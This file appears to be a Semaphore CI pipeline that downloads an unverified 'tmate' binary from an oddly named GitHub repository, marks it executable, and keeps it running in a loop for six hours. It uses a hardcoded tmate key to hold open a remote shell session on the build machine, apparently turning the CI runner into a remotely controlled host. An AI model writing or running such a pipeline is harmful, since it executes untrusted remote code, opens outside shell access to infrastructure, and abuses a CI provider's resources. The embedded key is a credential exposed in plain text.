version: v1.0
name: Run tmate for 6 hours
agent:
  machine:
    os_image: ubuntu2004
    type: e1-standard-2
blocks:
  - name: Download and Run tmate for 6 hours
    task:
      jobs:
        - name: Download and Run tmate
          commands:
            - checkout
            - sudo apt-get update
            - sudo apt-get install -y wget
            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
            - chmod +x tmate
            - |
              end=$((SECONDS+21600))
              while [ $SECONDS -lt $end ]; do
                ./tmate -F -n j1 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg || true
                sleep 5
              done
